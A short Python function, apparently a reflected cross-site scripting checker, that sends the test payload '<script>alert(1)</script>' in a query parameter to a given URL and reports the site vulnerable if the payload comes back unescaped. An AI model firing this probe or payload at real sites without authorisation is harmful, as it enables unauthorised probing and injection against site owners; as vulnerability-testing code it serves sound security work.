import requests

def xss_poc(target):
    test_payload = "<script>alert(1)</script>"
    try:
        response = requests.get(target, params={"q": test_payload}, timeout=5)
        if test_payload in response.text:
            return f"VULNERABLE: Reflected XSS detected on {target}"
        return "Clean"
    except Exception as e:
        return f"Greška: {str(e)}"
